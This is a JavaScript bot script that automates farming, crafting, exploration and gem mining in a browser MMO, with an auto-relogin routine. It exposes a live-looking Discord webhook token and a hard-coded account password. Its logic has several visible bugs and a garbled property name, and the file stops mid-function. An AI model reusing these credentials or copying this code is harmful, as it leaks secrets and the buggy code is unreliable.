window.addEventListener('keydown', function (e) {
  187 == e.keyCode && showCharacterStatus();
  107 == e.keyCode && showCharacterStatus();
});

function showCharacterStatus() {
  let t = jv.text('', {
    font: '1px Verdana',
    //tamaño del texto
    fill: 16777215,
    //color
    stroke: 1,
    //color del borde de las letras
    strokeThickness: 1,
    //thickness del borde de las letras
  });
  jv.add(t),
    (function e() {
      (hp_status.title.text = `${hp_status.val.toLocaleString()}%`),
        (exp_status.title.text = `${exp_status.val.toLocaleString()}%`),
        skill_status.alpha > 0 &&
        ')' != skill_status.title.text[skill_status.title.text.length - 1] &&
        (skill_status.title.text += `(${skill_status.val.toLocaleString()}%)`);
      try {
        t.text = getMob(me).x + ',' + getMob(me).y + ' ' + jv.map_title.text;
      } catch (t) { }
      requestAnimationFrame(e);
    })();

  var KeyG = jv.keyboard(71)
  KeyG.press = function () {
    input_field.hasfocus || editing ||
      -1 !== me && jv.ability[5] &&
      jv.ability[5].do_click()
  }

}

//smith
async function SmithBot() {
  await xDoDropSlot(1, 1);
  await xDoKeyPress(6, 40)
  await xDelay(1000);
  SmithBot()
}

async function SmithBot1() {
  if (xGetSlotByID(761) != undefined) {
    if (inv[xGetSlotByID(761)].quantity >= 1) {
      xDoDropByID(1, 761);
    }
  }
  await xDelay(1500);
  SmithBot1()
}

//coords grabber

/*
var discordLink1 = "https://discord.com/api/webhooks/1055109861232349325/Slvd-kjr_RyzYFtbAWRpInpD6V1JSomiGehFEmA_jG61FrkAq9v6c7X07aCDM4h_a7YH";

let nombre = myself.name
let lr = myself.x
let ud = myself.y
let mapa = jv.map_title.text

async function coords() {


  await xDelay(100)

  sendToDiscord1(discordLink1, nombre + ": " + lr + "," + ud + " " + mapa)
  console.log(nombre + ": " + lr + "," + ud + " " + mapa)
  await xDelay(30000)
}

function startcoords() {
  setInterval(coords, 1000);
  clearInterval(IntervalStart);
}

IntervalStart = setInterval(coords, 1000);

function sendToDiscord1(discordLink, text1) {

  fetch(discordLink1, {
    body: JSON.stringify({
      content: text,
    }),
    headers: {
      "Content-Type": "application/json",
    },
    method: "POST",
  })
    .then(function (res) {
      console.log(res);
    })
    .catch(function (res) {
      console.log(res);
    });

}
*\



//clay farm bot

/*
X + 1 east
X - 1 west
Y + 1 south
Y - 1 North
*/

async function ClayEW2() {

  //equip shovel
  await xDelay(100)

  if (xCurrentTool == undefined) {
    await xDelay(100)
    xCurrentTool = xGetItemNameBySlot(0);
    await xDelay(100)
  }

  const StartPosX = myself.x
  const StartPosY = myself.y


  //auto hit
  await xDelay(100)
  xDoKeyPress(6, 100)
  await xDelay(100)

  //repair shovel 

  //drop shovel move to the left and face the shovel
  if (inv[0].equip == 2) { //if weapon is red, ctrl, down, drop weapon move
    //drop tool
    await xDoDropSlot(1, 1)
    await xDelay(100)
    //go to the right
    await xDoKeyPress(0, 100)
    await xDelay(100);
    //face to the left
    await xDoKeyDown(4)
    await xDelay(100)
    await xDoKeyPress(1, 100)
    await xDelay(100)
    await xDoKeyUp(4)
    await xDelay(400)

    //equip repair kit
    if (inv[0].sprite != 621) {
      await xDelay(100)
      await xDoUseSlot(1)
      await xDelay(100)
    }
    //take shovel if its repaired
    if (xIfChatHas(" is in perfect condition.") == true) {
      xDoClearChat(" is in perfect condition");
      await xDelay(400)
      await xDoKeyPress(1, 100)
      await xDelay(400)
      await xDoKeyPress(5, 100)
      await xDoUseSlot(1, 1)
    }

  }


  // if tile infront is dirt go left
  if (xGetTileByPos(StartPosX - 1, StartPosY).spr == 22) {
    await xDoKeyPress(1, 100)
    await xDelay(100)
    await xDelay(1000)
    print

    //Check north tile and repair it 
    if (xGetTileByPos(StartPosX, StartPosY - 1).spr != 105 || 106) {
      await xDoKeyDown(4);
      await xDoKeyPress(2, 100)
      await xDelay(100)
      //repair north tile
      await xDoKeyPress(6, 100)
      await xDelay(100)
      //Check west side and repair it
      await xDelay(1000)

      //test
      await xGetTileByPos(StartPosX, StartPosY - 1).spr == 105, 106

      if (xGetTileByPos(StartPosX - 1, StartPosY).spr != 105, 106) {
        await xDoKeyDown(4);
        await xDoKeyPress(1, 100)
        await xDelay(100)
        //repair west side
        await xDoKeyPress(6, 100)
        await xDelay(100)
        //check south side and repair it
        await xDelay(1000)

        //test
        await xGetTileByPos(StartPosX - 1, StartPosY).spr == 105, 106

        if (xGetTileByPos(StartPosX, StartPosY + 1).spr != 105, 106) {
          await xDoKeyDown(4);
          await xDoKeyPress(3, 100)
          await xDelay(100)
          //repair south side
          await xDoKeyPress(6, 100)
          await xDelay(100)
          await xDoKeyUp(4);

          //test
          await xGetTileByPos(StartPosX, StartPosY + 1).spr == 105, 106

          //go back to original place
          if (xGetTileByPos(StartPosX, StartPosY + 1) && xGetTileByPos(StartPosX, StartPosY - 1) && xGetTileByPos(StartPosX - 1, StartPosY).spr == 105, 106) {
            //go to the original tile
            await xDoKeyPress(0, 100)
            await xDelay(100)
            //face to the right to keep digging
            await xDoKeyDown(4);
            await xDelay(100)
            await xDoKeyPress(1, 100)
            await xDelay(100)
            await xDoKeyUp(4);
          }
        }
      }
    }
    await xDelay(1000 - 2000)
  }
  await xDelay(1000 - 2000)
  ClayEW2()
}

//auto chest farm
async function stpchest() {

  const usernameVal = "arretstp"
  const passVal = 'holabuendia'

  //face to the chest
  await xDoKeyDown(4)
  await xDoKeyPress(1, 100)
  await xDelay(100)
  await xDoKeyUp(4)
  await xDelay(100)

  //open chest
  await xDoKeyPress(6, 100)
  await xDelay(500)

  //go to the chest tile
  await xDoKeyPress(1, 100)
  await xDelay(2000)
  await xDoKeyPress(5, 100)
  await xDelay(100)
  //pick up whatever it dropped
  await xDoKeyPress(5, 100)
  await xDelay(100)

  //go back to where you were
  await xDoKeyPress(0, 100)
  await xDoLogOff()
  StartInterval = setInterval(startautolog, 1000);
  async function autolog() {
    if (alGoing == true)
      return;
    alGoing = true;
    if (myself == undefined) {
      if (hasNotif == false) {
        hasNotif = true;
        await xDelay(2500)
      }
      if (connection != undefined) {
        if (connection.readyStateresearchstateresearch == 3) {
          await xDelay(5000);
          jv.selected_ip = 'use2.mysteralegacy.com';
          do_connect();
        } else if (connection.readyStateresearchstateresearch == 1) {
          await xDelay(10000)
          send({
            type: "login",
            user: jv.base64_encode(jv.login_dialog.username.chars.trim()),
            pass: jv.base64_encode(jv.login_dialog.password.chars.trim())
          });
        }
      }

    } else {
      hasNotif = false;
    }
    await xDelay(180000);
    alGoing = false;
  }



  function startautolog() {
    if (myself == undefined) {
      setInterval(autolog, 1000);
      clearInterval(StartInterval);
    }
  }


  stpchest()
}

//Auto research and try to train it without breaking books
var Nslots = 0
var statreseloop = false
var stateresearch = 7
var stateforfirstlearn = true
var stateforsecondlearn = true

async function rese(Nslots) {
  if (myself == undefined)
    return;

  if (stateresearch == 7 && xIfChatHas("falls apart")) {
    await xDoClearChat("falls apart")
    await xDoKeyPress(5, 100)
    stateresearch = 8
  }
  if (stateresearch == 8 && xIfChatHas("falls apart")) {
    await xDoClearChat("falls apart")
    await xDoKeyPress(0, 100)
    await xDelay(100)
    await xDoKeyPress(5, 100)
    await xDelay(100)
    await xDoKeyPress(1, 100)
    stateresearch = 7
  }

  if (stateforfirstlearn && stateresearch == 7) {
    await xDoKeyPress(7, 100)
    stateforfirstlearn = false
    stateforsecondlearn = true
  }

  if (stateforsecondlearn && stateresearch == 8) {
    await xDoKeyPress(8, 100)
    stateforsecondlearn = false
    stateforfirstlearn = true
  }


  if (stateresearch == 7) {
    if (xIfChatHas("You fail to learn")) {
      await xDoKeyPress(7, 100)
      await xDoClearChat('You fail to learn');
    }

    if (xIfChatHas("You've already learned this")) {
      stateresearch = 8
      await xDoClearChat("You've already learned this");
    }

    if (xIfChatHas("You learn")) {
      await xDoClearChat("You learn")
      stateresearch = 8
      if (Nslots == 2) {
        await xDoChat("/swap 1 2")
      } else if (Nslots == 3) {
        await xDoChat("/swap 1 3")
      } else if (Nslots == 4) {
        await xDoChat("/swap 1 4")
      } else if (Nslots == 5) {
        await xDoChat("/swap 1 5")
      } else if (Nslots == 6) {
        await xDoChat("/swap 1 6")
      }
    }
  }

  if (stateresearch == 8) {
    if (xIfChatHas("You fail to learn")) {
      await xDoKeyPress(8, 100)
      await xDoClearChat('You fail to learn');
    }
    if (xIfChatHas("You've already learned this")) {
      stateresearch = 7
      await xDoClearChat("You've already learned this");
    }
    if (xIfChatHas("You learn")) {
      await xDoClearChat("You learn")
      stateresearch = 7
      if (Nslots == 2) {
        await xDoChat("/swap 1 2")
      } else if (Nslots == 3) {
        await xDoChat("/swap 1 3")
      } else if (Nslots == 4) {
        await xDoChat("/swap 1 4")
      } else if (Nslots == 5) {
        await xDoChat("/swap 1 5")
      } else if (Nslots == 6) {
        await xDoChat("/swap 1 6")
      }
    }
  }
  if (statreseloop) {
    await xDelay(1000)
    rese(Nslots);
  }
}

/*
-Key IDs-
0 - Right
1 - Left
2 - Up
3 - Down
4 - Ctrl
5 - Shift
6 - Space
7 - D1
8 - D2
9 - D3
10 - D4
11 - D5
12 - D6
13 - D7
14 - D8
15 - D9
*/


async function knitting1() {
  await xDoUseSlot(0, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(1, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(2, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(3, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(4, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(5, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(6, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(7, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)

  await xDoUseSlot(8, 1)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
  await xDoKeyPress(6, 1000)
}
/*
//exploration (deep cave)
var exploloop = false
var loopRight = false
var loopleft = false
var loopup = false
var loopdown = false
const ExplostartCoordX = 11
const ExplostartCoordY = 494
var ExploChunkCheckerX = 10
var ExploChunkCheckerY = 490
var ExploLineX = 15 //begining 15, end 492 
var ExploLineY = 494 //begining 494, end 4
var wallinfront = false
var goingRight = false
var goingLeft = false

async function explo() {

  //start
  if (ExplostartCoordX == myself.x && ExplostartCoordY == myself.y) {
    loopRight = true
    loopleft = false
    loopup = false
    loopdown = false
    goingRight = true
  }

  //swap line of chunks from going right
  if (myself.x >= 492) {
    loopRight = false
    loopup = true
    ExploChunkCheckerX = 10
    ExploChunkCheckerY - 10
    ExploLineX = 492
    ExploLineY - 10
  }

  if (goingRight && myself.x >= 492 && ExploLineY == myself.y) {
    loopup = false
    loopleft = true
  }

  //====================================swap line of chunks from going left

  if (loopleft && myself.x <= 15) {
    loopleft = false
    loopup = true
    ExploChunkCheckerX = 10
    ExploChunkCheckerY - 10
    ExploLineX = 15
    ExploLineY - 10
  }
  //===============================================Go back to original position once you end
  if (myself.x <= 7 && myself.y <= 7) {
    loopdown = true
  }


  //go right
  while (loopRight) {
    await xDoKeyPress(0, 100)
    //Avoid walls and shit
    if (xGetTileByPos(myself.x + 1, myself.y).spr == 34) {
      wallinfront = true
      
      goingRight = true
      if (xGetWallByPos(myself.x + 1, myself.y - 1) == undefined && xGetTileByPos(myself.x + 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x, myself.y - 1).spr != 34) {
        await xDoKeyPress(2, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x + 1, myself.y + 1) == undefined && xGetTileByPos(myself.x, myself.y + 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(3, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      }
    }

    if (ExploLineY > myself.y && !wallinfront) {
      await xDoKeyPress(3, 100)
    }
    if (ExploLineY < myself.y && !wallinfront) {
      await xDoKeyPress(2, 100)
    }
  }

  //go left
  while (loopleft) {
    await xDoKeyPress(1, 100)
    //Avoid walls and shit
    //Going right
    if (xGetTileByPos(myself.x - 1, myself.y).spr == 34) {
      wallinfront = true
      
      goingLeft = true
      if (xGetWallByPos(myself.x - 1, myself.y - 1) == undefined && xGetTileByPos(myself.x - 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x, myself.y - 1).spr != 34) {
        await xDoKeyPress(2, 100)
        await xDoKeyPress(1, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y + 1) == undefined && xGetTileByPos(myself.x, myself.y + 1).spr != 34 && xGetTileByPos(myself.x - 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(3, 100)
        await xDoKeyPress(1, 100)
        wallinfront = false
      }
    }

    if (ExploLineY > myself.y && !wallinfront) {
      await xDoKeyPress(3, 100)
    }
    if (ExploLineY < myself.y && !wallinfront) {
      await xDoKeyPress(2, 100)
    }
  }
  //go up
  while (loopup) {
    await xDoKeyPress(2, 100)
    //Avoid walls and shit
    if (xGetTileByPos(myself.x, myself.y - 1) == 34) {
      wallinfront = true
      
      if (xGetWallByPos(myself.x + 1, myself.y - 1) == undefined && xGetTileByPos(myself.x + 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y).spr != 34) {
        await xDoKeyPress(0, 100)
        await xDoKeyPress(2, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y - 1) == undefined && xGetTileByPos(myself.x - 1, myself.y).spr != 34 && xGetTileByPos(myself.x - 1, myself.y - 1).spr != 34) {
        await xDoKeyPress(1, 100)
        await xDoKeyPress(2, 100)
        wallinfront = false
      }
    }

    if (ExploLineX > myself.x && !wallinfront) {
      await xDoKeyPress(0, 100)
    }
    if (ExploLineX < myself.x && !wallinfront) {
      await xDoKeyPress(1, 100)
    }
  }
  //go down
  while (loopdown) {
    await xDoKeyPress(3, 100)
    //Avoid walls and shit
    if (xGetTileByPos(myself.x, myself.y + 1) == 34) {
      wallinfront = true
      
      if (xGetWallByPos(myself.x + 1, myself.y + 1) == undefined && xGetTileByPos(myself.x + 1, myself.y + 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y).spr != 34) {
        await xDoKeyPress(0, 100)
        await xDoKeyPress(3, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y + 1) == undefined && xGetTileByPos(myself.x - 1, myself.y).spr != 34 && xGetTileByPos(myself.x - 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(1, 100)
        await xDoKeyPress(3, 100)
        wallinfront = false
      }
    }

    if (ExploLineX > myself.x && !wallinfront) {
      await xDoKeyPress(0, 100)
    }
    if (ExploLineX < myself.x && !wallinfront) {
      await xDoKeyPress(1, 100)
    }
  }


  //deep cave walls are tiles, altars are walls and so are fountains and holes

  if (exploloop) {
    xDelay(100)
    explo()
  }
}
*/

//exploration (deep cave)
//variable esenciales
var exploloop = false
var loopRight = false
var loopleft = false
var loopup = false
var loopdown = false
var wallinfront = false
//
var ExplostartCoordX = 11
var ExplostartCoordY = 494
var ExploChunkCheckerX = 10
var ExploChunkCheckerY = 490
var ExploLineX = 15 //begining 15, end 492 
var ExploLineY = 494 //begining 494, end 4
var goingRight = false
var goingLeft = false

async function explo() {

  //start ta bien
  if (ExplostartCoordX == myself.x && ExplostartCoordY == myself.y) {
    loopRight = true
    loopleft = false
    loopup = false
    loopdown = false
    goingRight = true
  }

  //Go back to original position once you end
  if (myself.x <= 7 && myself.y <= 7) {
    loopdown = true
  }


  //go right
  while (loopRight) {
    //Avoid walls and shit
    if (xGetTileByPos(myself.x + 1, myself.y).spr == 34) {
      wallinfront = true

      goingRight = true
      if (xGetWallByPos(myself.x + 1, myself.y - 1) == undefined && xGetTileByPos(myself.x + 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x, myself.y - 1).spr != 34) {
        await xDoKeyPress(2, 100)
        await xDoKeyPress(0, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x + 1, myself.y + 1) == undefined && xGetTileByPos(myself.x, myself.y + 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(3, 100)
        await xDoKeyPress(0, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      }
    }

    if (xGetWallByPos(myself.x + 1, myself.y)) {
      wallinfront = true

      goingRight = true
      if (xGetWallByPos(myself.x + 1, myself.y - 1) == undefined && xGetTileByPos(myself.x + 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x, myself.y - 1).spr != 34) {
        await xDoKeyPress(2, 100)
        await xDoKeyPress(0, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x + 1, myself.y + 1) == undefined && xGetTileByPos(myself.x, myself.y + 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(3, 100)
        await xDoKeyPress(0, 100)
        await xDoKeyPress(0, 100)
        wallinfront = false
      }
    }

    if (!wallinfront) {
      await xDoKeyPress(0, 100)
      await xDelay(100)
    }

    //Keep acc on the line 
    if (ExploLineY > myself.y && !wallinfront) {
      await xDoKeyPress(3, 100)
    }
    if (ExploLineY < myself.y && !wallinfront) {
      await xDoKeyPress(2, 100)
    }

    //swap line of chunks from going right to left
    if (myself.x >= 492) {
      loopRight = false
      loopup = true
      ExploChunkCheckerX = 10
      ExploChunkCheckerY = ExploChunkCheckerY - 10
      ExploLineX = 492
      ExploLineY = ExploLineY - 10
    }
    await xDelay(100)
  }

  //go left
  while (loopleft) {
    //Avoid walls and shit
    //Going right
    if (xGetTileByPos(myself.x - 1, myself.y).spr == 34 || xGetWallByPos(myself.x - 1, myself.y)) {
      wallinfront = true

      goingLeft = true
      if (xGetWallByPos(myself.x - 1, myself.y - 1) == undefined && xGetTileByPos(myself.x - 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x, myself.y - 1).spr != 34) {
        await xDoKeyPress(2, 100)
        await xDoKeyPress(1, 100)
        await xDoKeyPress(1, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y + 1) == undefined && xGetTileByPos(myself.x, myself.y + 1).spr != 34 && xGetTileByPos(myself.x - 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(3, 100)
        await xDoKeyPress(1, 100)
        await xDoKeyPress(1, 100)
        wallinfront = false
      }
    }

    if (!wallinfront) {
      await xDoKeyPress(1, 100)
      await xDelay(100)
    }

    if (ExploLineY > myself.y && !wallinfront) {
      await xDoKeyPress(3, 100)
    }
    if (ExploLineY < myself.y && !wallinfront) {
      await xDoKeyPress(2, 100)
    }

    //swap line of chunks from going left to right

    if (loopleft && myself.x <= 15) {
      loopleft = false
      loopup = true
      ExploChunkCheckerX = 10
      ExploChunkCheckerY = ExploChunkCheckerY - 10
      ExploLineX = 15
      ExploLineY = ExploLineY - 10
    }
    await xDelay(100)
  }

  //go up
  while (loopup) {
    //Avoid walls and shit
    if (xGetTileByPos(myself.x, myself.y - 1).spr == 34 || xGetWallByPos(myself.x, myself.y - 1)) {
      wallinfront = true

      if (xGetWallByPos(myself.x + 1, myself.y - 1) == undefined && xGetTileByPos(myself.x + 1, myself.y - 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y).spr != 34) {
        await xDoKeyPress(0, 100)
        await xDoKeyPress(2, 100)
        await xDoKeyPress(2, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y - 1) == undefined && xGetTileByPos(myself.x - 1, myself.y).spr != 34 && xGetTileByPos(myself.x - 1, myself.y - 1).spr != 34) {
        await xDoKeyPress(1, 100)
        await xDoKeyPress(2, 100)
        await xDoKeyPress(2, 100)
        wallinfront = false
      }
    }

    if (!wallinfront) {
      await xDoKeyPress(2, 100)
      await xDelay(100)
    }

    if (ExploLineX > myself.x && !wallinfront) {
      await xDoKeyPress(0, 100)
    }
    if (ExploLineX < myself.x && !wallinfront) {
      await xDoKeyPress(1, 100)
    }

    if (ExploLineY >= myself.y && ExploLineX == 492) {
      loopup = false
      loopleft = true
    }

    if (ExploLineY >= myself.y && ExploLineX == 15) {
      loopup = false
      loopRight = true
    }
    await xDelay(100)
  }

  //go down
  while (loopdown) {
    await xDoKeyPress(3, 100)
    //Avoid walls and shit
    if (xGetTileByPos(myself.x, myself.y + 1).spr == 34 || xGetWallByPos(myself.x, myself.y + 1)) {
      wallinfront = true

      if (xGetWallByPos(myself.x + 1, myself.y + 1) == undefined && xGetTileByPos(myself.x + 1, myself.y + 1).spr != 34 && xGetTileByPos(myself.x + 1, myself.y).spr != 34) {
        await xDoKeyPress(0, 100)
        await xDoKeyPress(3, 100)
        await xDoKeyPress(3, 100)
        wallinfront = false
      } else if (xGetWallByPos(myself.x - 1, myself.y + 1) == undefined && xGetTileByPos(myself.x - 1, myself.y).spr != 34 && xGetTileByPos(myself.x - 1, myself.y + 1).spr != 34) {
        await xDoKeyPress(1, 100)
        await xDoKeyPress(3, 100)
        await xDoKeyPress(3, 100)
        wallinfront = false
      }
    }

    if (!wallinfront) {
      await xDoKeyPress(3, 100)
      await xDelay(100)
    }

    if (ExploLineX > myself.x && !wallinfront) {
      await xDoKeyPress(0, 100)
    }
    if (ExploLineX < myself.x && !wallinfront) {
      await xDoKeyPress(1, 100)
    }
    await xDelay(100)
  }


  //deep cave walls are tiles, altars are walls and so are fountains and holes

  if (exploloop) {
    await xDelay(100)
    explo()
  }
}


//Wc gem bot

var UpperGemMined = false;
var LowerGemMined = false;

let coordsUpperGem = [
  [79, 66],
  [79, 67],
  [79, 68],
  [80, 66],
  [80, 67],
  [80, 68],
  [81, 66],
  [81, 67],
  [81, 68],
  [0, 0]
];

let coordsLowerGem = [
  [77, 70],
  [77, 71],
  [77, 72],
  [78, 70],
  [78, 71],
  [78, 72],
  [79, 70],
  [79, 71],
  [79, 72],
  [0, 0]
];

var num1gem = 0;
// Patron x

var num3gem = 0;
// Patron x

var UpperGemAtx = 0;
var UpperGemAtY = 0;
var LowerGemAtx = 0;
var LowerGemAtY = 0;
var mobnearby = false;
var gemrepair = 0;
var playernearby = false;
var repaircount = 0;
var pickEquiped = false;


/*
Ejemplo array bidimensional

let items = [
  [1, 2],
  [3, 4],
  [5, 6]
];
console.log(items[0][0]); // 1
console.log(items[0][1]); // 2
console.log(items[1][0]); // 3
console.log(items[1][1]); // 4
console.log(items);
*/

/*
-Key IDs-
0 - Right
1 - Left
2 - Up
3 - Down
4 - Ctrl
5 - Shift
6 - Space
7 - D1
8 - D2
9 - D3
10 - D4
11 - D5
12 - D6
13 - D7
14 - D8
15 - D9
*/

// -- Server rebooting
async function WCgem(usernameVal, passVal) {

  if (xIfChatHas("-- Server rebooting")) {
    await xDoClearChat("-- Server rebooting")
    console.log("Server reseted, please do manual reset")
    await xDoLogOff()
  }
  //check if theres repair kits

  if (!xGetSlotByID(719)) {
    console.log("Theres no repair kits")
    await xDoLogOff()
    return;
  }

  //Heal
  setInterval(xHeal, 1000);
  //food
  setInterval(xFood, 1500);
  async function xFood() {
    if (myself == undefined)
      return;
    if (xGoing[103] != true) {
      xGoing[103] = true;
      if (xGetSlotFood() != undefined) {
        if (hunger_status.val <= 10) {
          xDoUseSlotByID(xGetSlotFood());
          await xDelay(2000);
        }
      }
      xGoing[103] = false;
    }
  }
  //kill mobs
  // mob finding things
  // xGetMobByName("Dire wolf")
  // xGetMobByName("Ice elemental")
  // xDoSpell(895) dash
  // xDoSpell(911) ww
  // xDoSpell(909) dis
  // xDoSpell(894) inti
  // xDoSpell(910) hr
  // xDoSpell(905) shell
  //repair

  //Check for ppl nearby
  setInterval(xCheckForPlayersNearby(), 1500);
  //check for mobs
  //setInterval(xCheckForMobsSquareArea(76, 83, 64, 75), 1500);



  //if theres no gem act has if it was mined
  if (coordsUpperGem[num1gem][0] == 0 && coordsUpperGem[num1gem][1] == 0) {

    UpperGemMined = true;

  }
  if (coordsLowerGem[num3gem][0] == 0 && coordsLowerGem[num3gem][1] == 0) {

    LowerGemMined = true;

  }

  //loop to mine the rock gem
  while (!UpperGemMined) {

    xCheckForMobsSquareArea(76, 83, 64, 75)
    //check for mobs n goes n kills them without spells
    if (mobnearby && xGetMobByName("Dire wolf") && xGetMobByName("Dire wolf").y >= 64 && xGetMobByName("Dire wolf").x >= 76 && xGetMobByName("Dire wolf").x <= 83 && xGetMobByName("Dire wolf").y <= 75) {
      await send({
        type: "t",
        t: xGetMobByName("Dire wolf")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Dire wolf").x, xGetMobByName("Dire wolf").y)
      console.log("Dire wolf locked in")
    } else if (mobnearby && xGetMobByName("Ice elemental") && xGetMobByName("Ice elemental").y >= 64 && xGetMobByName("Ice elemental").x >= 76 && xGetMobByName("Ice elemental").x <= 83 && xGetMobByName("Ice elemental").y <= 75) {
      await send({
        type: "t",
        t: xGetMobByName("Ice elemental")
          .id
      })
      await xDoKeyPress(10, 100)
      await xDoKeyPress(11, 100)
      pickEquiped = false;
      xDoMove(xGetMobByName("Ice elemental").x, xGetMobByName("Ice elemental").y)
      console.log("Ice elemental locked in")
    } else {
      mobnearby = false;
    }

    // use spells if hp too low
    if (hp_status.val <= 50 && hp_status.val >= 0.1) {
      //shell
      xDoSpell(905)
      await xDelay(3000)
    }
    if (hp_status.val <= 30 && hp_status.val >= 0.1) {
      //hr
      xDoSpell(910)
      await xDelay(3000)
    }
    if (hp_status.val <= 20 && hp_status.val >= 0.1) {
      //inti
      xDoSpell(894)
      await xDelay(3000)
    }

    //equip pickaxe and check if its equip n shit
    xCheckForMobsSquareArea(76, 83, 64, 75)
    if (!pickEquiped && !mobnearby) {
      await xDoKeyPress(9, 100)
      await xDelay(100)
      if (xIfChatHas("You unequip the Steel Pickaxe ")) {
        await xDelay(100)
        await xDoClearChat("You unequip the Steel Pickaxe ")
        await xDelay(100)
        await xDoKeyPress(9, 100)
        pickEquiped = true;
